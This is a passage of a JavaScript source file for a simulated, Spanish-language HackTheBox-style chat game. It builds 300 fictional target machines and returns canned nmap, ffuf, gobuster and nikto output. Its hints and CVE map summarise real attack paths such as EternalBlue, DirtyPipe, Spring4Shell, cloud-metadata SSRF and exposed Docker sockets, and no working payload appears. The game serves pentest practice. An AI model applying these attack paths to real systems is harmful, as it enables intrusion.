// hackthebox.js — Juego HTB completo: campaña 300 máquinas
// Coded by C3rb3rus-666
// SIMULACIÓN TOTAL: todos los comandos son simulados contextualmente por tipo de máquina.
// No se ejecuta nada real. Cada herramienta devuelve output realista según el vector de ataque.

const sessions = new Map();
const msfSessions = new Map(); // Estado de sesiones Metasploit por chatId

// ═══════════════════════════════════════════════════════════════════════════
// CONFIGURACIÓN DE DIFICULTADES Y RANGOS
// ═══════════════════════════════════════════════════════════════════════════

const DIFFICULTY = {
  facil:    { label: 'Fácil',    xp: 10,  color: '🟢' },
  medio:    { label: 'Medio',    xp: 20,  color: '🟡' },
  dificil:  { label: 'Difícil',  xp: 35,  color: '🟠' },
  extremo:  { label: 'Extremo',  xp: 50,  color: '🔴' },
  insano:   { label: 'INSANO',   xp: 75,  color: '💀' }
};

const rankThresholds = [
  { name: 'Script Kiddie',        min: 0,    badge: '👶' },
  { name: 'Noob',                 min: 50,   badge: '🐣' },
  { name: 'Hacker Wannabe',       min: 150,  badge: '🎭' },
  { name: 'Pentester Junior',     min: 300,  badge: '🔰' },
  { name: 'Pentester',            min: 500,  badge: '💻' },
  { name: 'Red Teamer',           min: 800,  badge: '🎯' },
  { name: 'Black Hat',            min: 1200, badge: '🎩' },
  { name: 'Elite Hacker',         min: 1800, badge: '⚡' },
  { name: 'OSCP Certified',       min: 2500, badge: '📜' },
  { name: 'OSCP Legend',          min: 3500, badge: '🏆' },
  { name: 'APT Operator',         min: 5000, badge: '🕵️' },
  { name: 'Nation-State Actor',   min: 7000, badge: '🦅' },
  { name: 'C3RB3RUS ELITE',       min: 9000, badge: '👑' }
];

function getRank(xp) {
  const rank = rankThresholds.slice().reverse().find(r => xp >= r.min);
  return { name: rank.name, badge: rank.badge };
}

// ═══════════════════════════════════════════════════════════════════════════
// TIPOS DE MÁQUINAS Y VECTORES DE ATAQUE
// ═══════════════════════════════════════════════════════════════════════════

const MACHINE_TYPES = [
  // Básicos (Fácil)
  { type: 'ssh',       ports: '22,80',           category: 'Linux',   vector: 'SSH bruteforce + privesc' },
  { type: 'web',       ports: '80,443',          category: 'Linux',   vector: 'Web enumeration + LFI' },
  { type: 'ftp',       ports: '21,22,80',        category: 'Linux',   vector: 'Anonymous FTP + creds leak' },
  
  // Intermedios (Medio)
  { type: 'smb',       ports: '139,445,3389',    category: 'Windows', vector: 'SMB enumeration + pass-the-hash' },
  { type: 'pivot',     ports: '22,80,443',       category: 'Linux',   vector: 'Lateral movement + tunneling' },
  { type: 'sqli',      ports: '80,3306',         category: 'Linux',   vector: 'SQL Injection + DB dump' },
  { type: 'wordpress', ports: '80,443',          category: 'Linux',   vector: 'WP plugin exploit + shell upload' },
  
  // Avanzados (Difícil)
  { type: 'ad',        ports: '88,389,445,3389', category: 'Windows', vector: 'Active Directory + Kerberoasting' },
  { type: 'docker',    ports: '22,2375,8080',    category: 'Linux',   vector: 'Docker escape + container breakout' },
  { type: 'api',       ports: '80,443,8080',     category: 'Linux',   vector: 'API fuzzing + JWT bypass' },
  { type: 'cloud',     ports: '22,443,8443',     category: 'Cloud',   vector: 'AWS/Azure misconfiguration' },
  
  // Extremos
  { type: 'kernel',    ports: '22,80',           category: 'Linux',   vector: 'Kernel exploit + dirty pipe' },
  { type: 'binary',    ports: '22,1337',         category: 'Linux',   vector: 'Buffer overflow + ROP chain' },
  { type: 'crypto',    ports: '22,443,9000',     category: 'Linux',   vector: 'Crypto weakness + key recovery' },
  
  // INSANOS
  { type: 'fullchain', ports: '22,80,443,3306,6379', category: 'Multi', vector: 'Full attack chain + 0day simulation' },
  { type: 'apt',       ports: '22,53,80,443,8080',   category: 'Multi', vector: 'APT simulation + persistence' }
];

// Nombres de máquinas estilo HTB real
const MACHINE_NAMES = [
  'Lame', 'Legacy', 'Devel', 'Popcorn', 'Beep', 'Optimum', 'Bastard', 'Granny', 'Arctic',
  'Grandpa', 'Silo', 'Bounty', 'Jerry', 'Blue', 'Active', 'Netmon', 'Forest', 'Sauna',
  'Monteverde', 'ServMon', 'Buff', 'Blunder', 'Tabby', 'Doctor', 'SneakyMailer', 'Intense',
  'OpenAdmin', 'Traceback', 'Admirer', 'Magic', 'Cascade', 'Blackfield', 'Ready', 'Delivery',
  'Tenet', 'ScriptKiddie', 'Ophiuchi', 'Spectra', 'TheNotebook', 'Armageddon', 'Knife', 'Pit',
  'Seal', 'Pikaboo', 'Cap', 'BountyHunter', 'Previse', 'Horizontall', 'Forge', 'Writer',
  'Backdoor', 'Shibboleth', 'Pandora', 'Paper', 'Timelapse', 'Meta', 'Routerspace', 'Unicode',
  'RedPanda', 'Trick', 'OpenSource', 'Photobomb', 'Shoppy', 'UpDown', 'Soccer', 'MetaTwo',
  'Ambassador', 'Precious', 'Flight', 'Escape', 'Inject', 'MonitorsTwo', 'Sau', 'Pilgrimage',
  // Nombres custom C3RB3RUS
  'Cerberus', 'Hellhound', 'Styx', 'Tartarus', 'Hades', 'Charon', 'Medusa', 'Hydra', 'Phoenix',
  'Kraken', 'Minotaur', 'Cyclops', 'Titan', 'Olympus', 'Pandora', 'Nemesis', 'Thanatos', 'Nyx',
  'Erebus', 'Chaos', 'Aether', 'Chronos', 'Morpheus', 'Hypnos', 'Ares', 'Athena', 'Poseidon',
  'Hermes', 'Apollo', 'Dionysus', 'Hephaestus', 'Prometheus', 'Atlas', 'Perseus', 'Achilles',
  'Odysseus', 'Icarus', 'Daedalus', 'Orpheus', 'Sisyphus', 'Tantalus', 'Minos', 'Theseus',
  // Cyberpunk/Tech names
  'Neuromancer', 'Wintermute', 'Armitage', 'Molly', 'Case', 'Dixie', 'Maelstrom', 'Blackice',
  'Razorgirl', 'Deckard', 'Replicant', 'Nexus', 'Tyrell', 'Voight', 'Kampff', 'Spinner',
  'Megacity', 'Sprawl', 'Matrix', 'Construct', 'Zion', 'Mainframe', 'Daemon', 'Subroutine',
  'Kernel', 'Rootkit', 'Payload', 'Shellcode', 'Exploit', 'Overflow', 'Injection', 'Bypass',
  'Sandbox', 'Firewall', 'Gateway', 'Proxy', 'Tunnel', 'Pivot', 'Beacon', 'Implant',
  // Hacking culture
  'Zero', 'Day', 'Shadow', 'Phantom', 'Ghost', 'Specter', 'Wraith', 'Shade', 'Void', 'Null',
  'Binary', 'Hex', 'Cipher', 'Enigma', 'Riddle', 'Puzzle', 'Maze', 'Labyrinth', 'Paradox',
  'Quantum', 'Singularity', 'Anomaly', 'Glitch', 'Bug', 'Worm', 'Trojan', 'Backdoor', 'Rooter',
  'Sniffer', 'Scanner', 'Crawler', 'Spider', 'Bot', 'Drone', 'Agent', 'Handler', 'Controller',
  // Latin/Dark
  'Nocturne', 'Umbra', 'Tenebris', 'Obscurus', 'Malware', 'Ransomware', 'Cryptor', 'Stealer',
  'Keylogger', 'Dropper', 'Loader', 'Packer', 'Obfuscator', 'Polymorphic', 'Metamorphic',
  // Extra para llegar a 300
  'Reaper', 'Harvester', 'Collector', 'Hunter', 'Tracker', 'Stalker', 'Predator', 'Apex',
  'Omega', 'Alpha', 'Beta', 'Gamma', 'Delta', 'Epsilon', 'Sigma', 'Lambda', 'Theta', 'Psi',
  'Node', 'Cluster', 'Grid', 'Mesh', 'Swarm', 'Hive', 'Colony', 'Network', 'Protocol', 'Socket',
  'Fortress', 'Citadel', 'Bastion', 'Bulwark', 'Rampart', 'Parapet', 'Watchtower', 'Sentinel',
  'Guardian', 'Warden', 'Keeper', 'Protector', 'Shield', 'Armor', 'Aegis', 'Phalanx', 'Legion',
  'Vanguard', 'Frontline', 'Breach', 'Fracture', 'Rupture', 'Fissure', 'Rift', 'Portal', 'Gate',
  'Nexus2', 'Hub', 'Core', 'Reactor', 'Engine', 'Generator', 'Dynamo', 'Turbine', 'Piston',
  'Vector', 'Scalar', 'Tensor', 'Matrix2', 'Array', 'Stack', 'Queue', 'Heap', 'Tree', 'Graph',
  'Vertex', 'Edge', 'Path', 'Route', 'Journey', 'Quest', 'Mission', 'Operation', 'Campaign'
];

// Hints por tipo de máquina
const HINTS = {
  ssh:       'Servidor SSH vulnerable. Enumera usuarios con enum4linux o hydra. Busca credenciales en /var/www/html/.',
  web:       'Web server expuesto. Usa gobuster/dirb para encontrar directorios ocultos. Busca en /var/www/html/secret.txt.',
  ftp:       'FTP con acceso anónimo. Conecta con ftp anonymous@ y busca archivos con credenciales.',
  smb:       'SMB expuesto. Usa smbclient -L para listar shares. Busca archivos sensibles en /tmp/shares/.',
  pivot:     'Red segmentada. Compromete el primer host, luego usa proxychains para pivotar al siguiente.',
  sqli:      'Web con SQL Injection. Usa sqlmap o inyección manual en el login. Dump de base de datos.',
  wordpress: 'WordPress vulnerable. Usa wpscan para enumerar plugins. Explota plugin vulnerable para shell.',
  ad:        'Active Directory. Enumera con BloodHound. Busca tickets Kerberos y haz Kerberoasting.',
  docker:    'Docker mal configurado. El socket está expuesto. Escapa del container para llegar al host.',
  api:       'API REST vulnerable. Fuzzea endpoints con ffuf. Bypasea autenticación JWT.',
  cloud:     'Infraestructura cloud. Busca credenciales AWS/Azure en metadata. SSRF al endpoint interno.',
  kernel:    'Kernel vulnerable. Después de shell, busca versión con uname -a. Usa exploit de kernel.',
  binary:    'Binario vulnerable en puerto 1337. Analiza con gdb/ghidra. Buffer overflow + ROP.',
  crypto:    'Servicio con crypto débil. Analiza el algoritmo. Recupera claves o bypasea verificación.',
  fullchain: 'Cadena completa de ataque. Web → DB → Redis → Docker → Host. Múltiples pivots.',
  apt:       'Simulación APT. Persistencia avanzada. Exfiltración de datos. Evade detección.'
};

// ═══════════════════════════════════════════════════════════════════════════
// GENERADOR DE MISIONES (300 MÁQUINAS)
// ═══════════════════════════════════════════════════════════════════════════

function buildMissions() {
  const missions = [];
  const totalMachines = 300;

  for (let i = 1; i <= totalMachines; i++) {
    // Distribución de dificultad progresiva
    let difficulty;
    if (i <= 50)       difficulty = 'facil';
    else if (i <= 120) difficulty = 'medio';
    else if (i <= 200) difficulty = 'dificil';
    else if (i <= 270) difficulty = 'extremo';
    else               difficulty = 'insano';

    // Seleccionar tipo de máquina según dificultad
    let typePool;
    if (difficulty === 'facil')        typePool = MACHINE_TYPES.slice(0, 3);   // ssh, web, ftp
    else if (difficulty === 'medio')   typePool = MACHINE_TYPES.slice(3, 7);   // smb, pivot, sqli, wordpress
    else if (difficulty === 'dificil') typePool = MACHINE_TYPES.slice(7, 11);  // ad, docker, api, cloud
    else if (difficulty === 'extremo') typePool = MACHINE_TYPES.slice(11, 14); // kernel, binary, crypto
    else                               typePool = MACHINE_TYPES.slice(14);     // fullchain, apt

    const machineType = typePool[i % typePool.length];
    
    // Generar IP realista por segmento
    const segment = Math.floor((i - 1) / 50);
    const ip = `10.10.${10 + segment}.${(i % 254) + 1}`;
    
    // Nombre de máquina
    const machineName = MACHINE_NAMES[(i - 1) % MACHINE_NAMES.length];
    
    // Credenciales variables
    const usernames = ['admin', 'user', 'dev', 'test', 'backup', 'ftp', 'www-data', 'mysql', 'postgres', 'git'];
    const uid = usernames[i % usernames.length] + (i > 100 ? i : '');
    const userPass = generatePassword(i, difficulty);
    const rootPass = `r00t_${machineName.toLowerCase()}_${i}`;

    // Rabbit holes — archivos trampa con credenciales falsas
    const rabbitFiles = ['todo.txt', 'old_backup.bak', 'readme.old', 'install.log', 'debug.log', 'test_creds.txt', 'temp_pass.txt'];
    const fakePasswords = ['h4x0r!', 'n0tThePass', 'changeme123', 'wrongcreds!', 'placeholder', 'testing123', 'default'];
    const rabbitHole = {
      file:     rabbitFiles[i % rabbitFiles.length],
      fakePass: fakePasswords[i % fakePasswords.length],
      triggered: false  // se activa cuando el jugador lee el archivo trampa
    };

    missions.push({
      id: i,
      name: machineName,
      ip,
      difficulty,
      type: machineType.type,
      ports: machineType.ports,
      category: machineType.category,
      vector: machineType.vector,
      hint: HINTS[machineType.type],
      user: uid,
      userPass,
      rootPass,
      userFlag: `HTB{${machineName.toLowerCase()}_user_${i}_pwned}`,
      rootFlag: `CERBERO{${machineName.toLowerCase()}_root_${i}_0wn3d}`,
      rabbitHole,
      state: {
        nmap: false,
        enum: false,
        foundCreds: false,
        ssh: false,
        userFlag: false,
        privesc: false,
        rootFlag: false
      }
    });
  }
  return missions;
}

// Genera contraseñas según dificultad
function generatePassword(seed, difficulty) {
  const simple = ['password', '123456', 'admin', 'letmein', 'welcome', 'monkey', 'dragon', 'master'];
  const medium = ['P@ssw0rd', 'Summer2024!', 'Admin123#', 'Qwerty!@#', 'Welcome1!'];
  const hard   = ['xK9#mL2$vQ', 'Tr0ub4dor&3', 'Zx!9Cv#2Bn', 'Mk@8Lp$5Wq'];
  
  if (difficulty === 'facil')   return simple[seed % simple.length];
  if (difficulty === 'medio')   return medium[seed % medium.length];
  return hard[seed % hard.length] + seed;
}

const ALL_MISSIONS = buildMissions();
const TOTAL_MACHINES = 300;

function getSession(chatId) {
  if (!sessions.has(chatId)) {
    sessions.set(chatId, {
      current: 1,
      xp: 0,
      completed: 0,
      missions: new Map(),
      cheats: 0,
      startedAt: Date.now(),
      history: [],
      achievements: new Set(),
      vfs: {},          // filesystem virtual por sesión: { 'filename': 'content' }
      hydraAttempts: 0, // para simular intentos fallidos de brute-force
    });
  }
  return sessions.get(chatId);
}

function getMission(session) {
  const missionId = Math.min(Math.max(1, session.current), TOTAL_MACHINES);
  return session.missions.get(missionId) || null;
}

function startMission(session) {
  const mid = Math.min(session.current, TOTAL_MACHINES);
  if (!session.missions.has(mid)) {
    session.missions.set(mid, JSON.parse(JSON.stringify(ALL_MISSIONS[mid - 1])));
  }
  return session.missions.get(mid);
}

function formatMissionInfo(mission) {
  const diff = DIFFICULTY[mission.difficulty];
  return `╔══════━┈┈ 𝑴𝑰𝑺𝑰𝑶́𝑵 ${mission.id}: ${mission.name} ┈┈━━━━╗\n` +
         `${diff.color} Dificultad: ${diff.label} | Categoría: ${mission.category}\n` +
         `🌐 IP: ${mission.ip} | Puertos: ${mission.ports}\n` +
         `🎯 Vector: ${mission.vector}\n` +
         `💡 Hint: ${mission.hint}\n` +
         `╚══════════════════════════════════════════════╝`;
}

function missionIntro(mission) {
  const threats = {
    ssh:       '🔐 Host con servicio SSH accesible. Credenciales débiles o expuestas.',
    web:       '🌐 Servidor web con información sensible. Directorios ocultos.',
    ftp:       '📁 FTP con acceso anónimo. Archivos con credenciales.',
    smb:       '📂 SMB/CIFS expuesto. Shares con datos sensibles.',
    pivot:     '🔀 Red segmentada. Movimiento lateral requerido.',
    sqli:      '💉 Aplicación web vulnerable a SQL Injection.',
    wordpress: '📝 WordPress con plugins vulnerables.',
    ad:        '🏢 Active Directory. Kerberos y LDAP expuestos.',
    docker:    '🐳 Docker mal configurado. Container escape posible.',
    api:       '⚡ API REST con autenticación débil.',
    cloud:     '☁️ Infraestructura cloud misconfigured.',
    kernel:    '🐧 Kernel vulnerable. Dirty Pipe/COW potential.',
    binary:    '💀 Binario vulnerable. Buffer overflow.',
    crypto:    '🔑 Crypto débil. Key recovery posible.',
    fullchain: '⛓️ Cadena completa. Múltiples pivots.',
    apt:       '🦅 Simulación APT. Persistencia avanzada.'
  };

  const diff = DIFFICULTY[mission.difficulty];
  const badge = `${diff.color} ${diff.label.toUpperCase()}`;

  return `
🎯 𝗠𝗜𝗦𝗜𝗢́𝗡 ${mission.id}: ${mission.name} [${badge}]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌐 Objetivo: comprometer ${mission.ip}
📍 Categoría: ${mission.category} | Tipo: ${mission.type.toUpperCase()}
🛡️ Amenaza: ${threats[mission.type] || threats.ssh}
🎯 Vector de ataque: ${mission.vector}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔍 Flujo sugerido:
   1. Reconocimiento → nmap ${mission.ip}
   2. Enumeración → según servicios encontrados
   3. Explotación → obtener shell inicial
   4. Escalada → privesc hacia root
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
}

function missionStatusText(session, mission) {
  const progress = [];
  const total = 7; // Total de pasos
  let done = 0;
  
  if (mission.state.nmap)      { progress.push('🔍 nmap'); done++; }
  if (mission.state.enum)      { progress.push('📋 enum'); done++; }
  if (mission.state.foundCreds){ progress.push('🔑 creds'); done++; }
  if (mission.state.ssh)       { progress.push('💻 shell'); done++; }
  if (mission.state.userFlag)  { progress.push('🚩 user'); done++; }
  if (mission.state.privesc)   { progress.push('⬆️ privesc'); done++; }
  if (mission.state.rootFlag)  { progress.push('👑 root'); done++; }
  
  const pct = Math.floor((done / total) * 100);
  const bar = '█'.repeat(Math.floor(pct / 10)) + '░'.repeat(10 - Math.floor(pct / 10));
  
  return `📊 Progreso misión ${mission.id} [${mission.name}]: ${pct}%
[${bar}] ${progress.join(' → ') || 'Sin iniciar'}`;
}

function evalCommand(session, mission, cmd, chatId) {
  const trimmed = cmd.trim().toLowerCase();
  const parts = trimmed.split(/\s+/);
  const command = parts[0];
  const t = mission.type; // shorthand para machine type

  // ══════════════════════════════════════════════════════════════════════
  // OUTPUTS CONTEXTUALES POR TIPO DE MÁQUINA
  // ══════════════════════════════════════════════════════════════════════

  // Puertos y servicios según tipo
  const portServices = {
    ssh:       { '22': 'ssh (OpenSSH 7.6p1)', '80': 'http (Apache 2.4.29)' },
    web:       { '80': 'http (Apache 2.4.41)', '443': 'https (nginx 1.18.0)' },
    ftp:       { '21': 'ftp (vsftpd 3.0.3 -- anon ok)', '22': 'ssh (OpenSSH 8.2p1)', '80': 'http (Apache 2.4.41)' },
    smb:       { '139': 'netbios-ssn', '445': 'microsoft-ds (Windows 2016)', '3389': 'ms-wbt-server (RDP)' },
    pivot:     { '22': 'ssh (OpenSSH 7.9p1)', '80': 'http (nginx 1.14.2)', '443': 'https' },
    sqli:      { '80': 'http (Apache 2.4.38 -- PHP/7.4.3)', '3306': 'mysql (MySQL 5.7.33)' },
    wordpress: { '80': 'http (Apache/WordPress 5.8.1)', '443': 'https' },
    ad:        { '88': 'kerberos-sec', '389': 'ldap (AD)', '445': 'microsoft-ds', '3389': 'ms-wbt-server' },
    docker:    { '22': 'ssh (OpenSSH 8.2p1)', '2375': 'docker (API v1.41 -- NO AUTH)', '8080': 'http (webapp)' },
    api:       { '80': 'http (nginx -- REST API)', '443': 'https', '8080': 'http-proxy (API v2)' },
    cloud:     { '22': 'ssh', '443': 'https (AWS/Azure endpoint)', '8443': 'https-alt (metadata)' },
    kernel:    { '22': 'ssh (OpenSSH 7.2p2 -- Ubuntu 16.04)', '80': 'http (Apache 2.4.18)' },
    binary:    { '22': 'ssh', '1337': 'waste (custom binary service)' },
    crypto:    { '22': 'ssh', '443': 'https (custom crypto service)', '9000': 'cslistener' },
    fullchain: { '22': 'ssh', '80': 'http', '443': 'https', '3306': 'mysql', '6379': 'redis (NO AUTH)' },
    apt:       { '22': 'ssh', '53': 'domain (BIND 9.11.3)', '80': 'http', '443': 'https', '8080': 'http-proxy' }
  };

  // Paths de web según tipo de máquina
  const webPaths = {
    web:       ['/admin (301)', '/backup (200)', '/.git (403)', '/secret.txt (200)', '/upload (301)', '/images (200)'],
    wordpress: ['/wp-admin (301)', '/wp-login.php (200)', '/wp-content/uploads/ (200)', '/xmlrpc.php (200)', '/wp-config.php.bak (200)'],
    sqli:      ['/login.php (200)', '/admin (301)', '/search.php (200)', '/products.php (200)', '/debug.php (403)'],
    api:       ['/api/v1 (200)', '/api/v2 (200)', '/api/v1/users (401)', '/api/v1/admin (403)', '/swagger (200)', '/api/v1/login (200)'],
    docker:    ['/app (200)', '/dashboard (301)', '/health (200)', '/metrics (200)', '/api/exec (403)'],
    cloud:     ['/dashboard (302)', '/metadata (200)', '/credentials (403)', '/.aws/credentials (403)', '/api/keys (401)'],
    pivot:     ['/internal (302)', '/admin (401)', '/proxy (200)', '/forward (200)'],
    apt:       ['/c2 (403)', '/implant (404)', '/beacon (200)', '/exfil (403)', '/persist (404)'],
  };

  // Mensajes de CVE/exploit según tipo
  const cveMap = {
    web:       'CVE-2021-41773 (Apache path traversal) — LFI confirmado',
    ftp:       'Anonymous FTP habilitado — no CVE requerido',
    smb:       'CVE-2017-0144 (EternalBlue / MS17-010) — Windows sin parchear',
    sqli:      'UNION-based SQLi en /search.php?q= — volcado de DB posible',
    wordpress: 'CVE-2020-25213 (wp-file-manager 6.0-6.8) — shell upload sin auth',
    ad:        'Kerberoasting — TGS solicitado para SPN: MSSQLSvc/db01.htb.local',
    docker:    'Docker API expuesta sin auth en :2375 — container escape trivial',
    api:       'CVE-2022-22965 (Spring4Shell) — RCE vía API endpoint /api/v1/run',
    cloud:     'IMDSv1 sin protección — SSRF hacia 169.254.169.254 retorna credenciales IAM',
    kernel:    'CVE-2022-0847 (DirtyPipe) — escritura sobre binario SUID',
    binary:    'Buffer overflow clásico — ret2libc con ROP chain en servicio :1337',
    crypto:    'AES-ECB sin padding — padding oracle attack posible',
    fullchain: 'Cadena: SSRF → Redis RCE → Docker socket → root del host',
    apt:       'APT simulado: DNS tunneling + proceso hollow + scheduled task persistence',
    pivot:     'Double pivot: foothold → DMZ host → red interna → target final',
    ssh:       'SSH con contraseña débil — hydra/medusa para bruteforce'
  };

  // ══════════════════════════════════════════════════════════════════════
  // 1. RECONOCIMIENTO
  // ══════════════════════════════════════════════════════════════════════

  if (command === 'nmap' || command === 'masscan' || command === 'rustscan') {
    const hasTarget = parts.some(p => p === mission.ip || p.includes(mission.ip.split('.').slice(0,3).join('.')));
    if (!hasTarget && command === 'nmap') return `❌ nmap: no se especificó un objetivo.\nUso: nmap [flags] ${mission.ip}\nEjemplos:\n   nmap ${mission.ip}\n   nmap -sV -sC ${mission.ip}\n   nmap -A -p- ${mission.ip}`;

    mission.state.nmap = true;
    const svcMap = portServices[t] || portServices.ssh;
    const flags = parts.slice(1).join(' ');
    const hasVer     = flags.includes('-sV') || flags.includes('-A');
    const hasScripts = flags.includes('-sC') || flags.includes('-A');
    const hasOS      = flags.includes('-O')  || flags.includes('-A');
    const hasAllPorts= flags.includes('-p-') || flags.includes('--all-ports');
    const isMasscan  = command === 'masscan';
    const isRust     = command === 'rustscan';

    // Timing simulado
    const scanTime = hasAllPorts ? '143.22s' : hasVer ? '18.45s' : '2.31s';
    const portCount = hasAllPorts ? '65535' : Object.keys(svcMap).length;

    let out = '';
    if (isRust) {
      out = `.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  \| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
\`-' \`-'\`-----'\`----'  \`-'  \`----'  \`---' \`-'  \`-'\`-' \`-'
Faster Nmap scanning with Rust — https://rustscan.github.io
${'─'.repeat(50)}\n`;
      out += `[~] Automatically increasing ulimit value to 5000.\n`;
      out += `Open ${mission.ip}:${Object.keys(svcMap).join('\nOpen ' + mission.ip + ':')}\n`;
      out += `[~] Starting Script(s)\n[>] Script to be run: nmap -vvv -p ${Object.keys(svcMap).join(',')} --reason -sV ${mission.ip}\n\n`;
    } else if (isMasscan) {
      out = `Scanning ${mission.ip} [${portCount} ports]\n`;
      for (const [port] of Object.entries(svcMap))
        out += `Discovered open port ${port}/tcp on ${mission.ip}\n`;
      out += `\nRate: 100000.00 packets/second\n`;
      return `🔍 Masscan:\n${'─'.repeat(40)}\n${out}${'─'.repeat(40)}\n💡 Ahora escanea versiones: nmap -sV -p ${Object.keys(svcMap).join(',')} ${mission.ip}`;
    } else {
      out = `Starting Nmap 7.94 ( https://nmap.org ) at ${new Date().toISOString().slice(0,16).replace('T',' ')} UTC\n`;
      out += `Nmap scan report for ${mission.ip}\n`;
      out += `Host is up (0.043s latency).\n\n`;
      out += `PORT      STATE  SERVICE${hasVer ? '         VERSION' : ''}\n`;
      for (const [port, svc] of Object.entries(svcMap))
        out += `${port.padEnd(9)} open   ${hasVer ? svc : svc.split(' ')[0]}\n`;
    }

    // NSE Scripts
    if (hasScripts) {
      if (t === 'smb' || t === 'ad') {
        out += `\n|_ smb-os-discovery:\n|   OS: Windows Server 2016 Standard 14393\n|   Computer name: DC01 | NetBIOS name: DC01\n|_  Domain: htb.local\n`;
        out += `| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|_  challenge_response: supported\n`;
        out += `| smb-vuln-ms17-010:\n|   VULNERABLE: EternalBlue (MS17-010)\n|   Risk factor: HIGH\n|_  https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n`;
      }
      if (t === 'ftp') {
        out += `\n| ftp-anon: Anonymous FTP login allowed\n|   -rw-r--r-- 1 ftp ftp  128 Jan 12  credentials.txt\n|_  -rw-r--r-- 1 ftp ftp 2048 Jan 10  backup.zip\n`;
      }
      if (t === 'wordpress') {
        out += `\n| http-title: ${mission.name} — Just another WordPress site\n| http-generator: WordPress 5.8.1\n`;
      }
      if (t === 'docker') {
        out += `\n| docker-version:\n|   ApiVersion: 1.41  Os: linux  Arch: amd64\n|_  Version: 20.10.7  Auth: NONE ← ¡PELIGROSO!\n`;
      }
      if (t === 'ssh') {
        out += `\n| ssh-hostkey:\n|   2048 RSA SHA256:xK9...\n|   256  ECDSA SHA256:mL2...\n| ssh-auth-methods: publickey,password\n`;
      }
    }

    // OS Detection
    if (hasOS) {
      const osGuess = mission.category === 'Windows' ?
        `OS details: Microsoft Windows Server 2016 (build 14393)\nNetwork Distance: 2 hops` :
        `OS details: Linux 4.15 - 5.6\nOS CPE: cpe:/o:linux:linux_kernel`;
      out += `\n${osGuess}\n`;
    }

    out += `\nNmap done: 1 IP address (1 host up) scanned in ${scanTime}\n`;
    out += `\n✅ Siguiente paso: enumera los servicios`;
    if (['web','wordpress','sqli','api','docker'].includes(t)) out += `\n💡 gobuster/ffuf para directorios web`;
    else if (['smb','ad'].includes(t))  out += `\n💡 enum4linux | smbclient | bloodhound`;
    else if (t === 'ftp')               out += `\n💡 ftp anonymous@${mission.ip}`;
    else if (t === 'docker')            out += `\n💡 docker -H tcp://${mission.ip}:2375 ps`;
    else if (t === 'binary')            out += `\n💡 nc ${mission.ip} 1337  →  analiza el servicio`;
    else if (t === 'kernel')            out += `\n💡 ssh ${mission.user}@${mission.ip}  →  uname -a`;

    return `🔍 Nmap:\n${'─'.repeat(40)}\n${out}${'─'.repeat(40)}`;
  }

  // ══════════════════════════════════════════════════════════════════════
  // 2. ENUMERACIÓN WEB — gobuster, ffuf, dirb, nikto, wfuzz, feroxbuster
  // ══════════════════════════════════════════════════════════════════════

  if (['gobuster', 'ffuf', 'dirb', 'nikto', 'wfuzz', 'feroxbuster', 'dirsearch'].includes(command)) {
    if (!mission.state.nmap) return `❌ Primero haz reconocimiento → nmap ${mission.ip}`;
    if (!['web','wordpress','sqli','api','docker','cloud','pivot','apt','fullchain','ssh','ftp'].includes(t))
      return `⚠️ ${command}: no hay servicio web expuesto en esta máquina. Intenta enum4linux o smbclient.`;

    mission.state.enum = true;
    const paths = webPaths[t] || webPaths.web;
    const targetUrl = `http://${mission.ip}`;

    let out = '';
    if (command === 'ffuf') {
      out = `        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/  v1.5.0\n\n [FUZZ] :: ${targetUrl}/FUZZ\n [Method] GET  [Wordlist] common.txt\n\n`;
      paths.forEach(p => {
        const [path, status] = p.split(' ');
        out += `${path.padEnd(25)} [Status: ${status.replace('(','').replace(')','')}, Size: ${Math.floor(Math.random()*5000)+100}]\n`;
      });
    } else if (command === 'gobuster') {
      out = `Gobuster v3.2.0 — Mode: dir — URL: ${targetUrl}\n${'='.repeat(45)}\n`;
      paths.forEach(p => out += `${p}\n`);
    } else if (command === 'dirb') {
      out = `DIRB v2.22 — URL: ${targetUrl}\n${'─'.repeat(40)}\n`;
      paths.forEach(p => { const [path] = p.split(' '); out += `+ ${targetUrl}${path}\n`; });
    } else if (command === 'nikto') {
      out = `- Nikto v2.1.6\n${'─'.repeat(40)}\n`;
      out += `+ Server: Apache/2.4.41 (Ubuntu)\n`;
      out += `+ X-Frame-Options: no presente (clickjacking)\n`;
      out += `+ /: Directory indexing en /backup/\n`;
      if (t === 'wordpress') out += `+ /wp-login.php: WordPress login page\n+ xmlrpc.php: habilitado — brute-force posible\n`;
      if (t === 'sqli') out += `+ /search.php: parámetro ?q= potencialmente vulnerable a SQLi\n`;
      if (t === 'api') out += `+ /api/v1: REST API expuesta, /swagger: documentación accesible\n`;
    } else {
      out = `[${command.toUpperCase()}] ${targetUrl}\n`;
      paths.forEach(p => out += `${p}\n`);
    }

    const cveNote = (t === 'web') ? `\n🐛 ${cveMap.web}` : (t === 'sqli') ? `\n🐛 ${cveMap.sqli}` : '';
    return `📋 ${command.toUpperCase()} — Simulación completa:\n${'─'.repeat(40)}\n${out}\n${'─'.repeat(40)}${cveNote}\n✅ Siguiente: busca archivos sensibles o explota vulnerabilidad`;
  }

  // ══════════════════════════════════════════════════════════════════════
  // 3. ENUMERACIÓN SMB / AD
  // ══════════════════════════════════════════════════════════════════════

  if (['enum4linux', 'smbclient', 'rpcclient', 'ldapsearch', 'bloodhound', 'kerbrute', 'crackmapexec', 'cme'].includes(command)) {
    if (!mission.state.nmap) return `❌ Primero haz reconocimiento → nmap ${mission.ip}`;
    if (!['smb','ad','pivot','fullchain','apt'].includes(t))
      return `⚠️ ${command}: SMB/AD no parece estar expuesto en esta máquina.`;

    mission.state.enum = true;
    let out = '';

    if (command === 'enum4linux') {
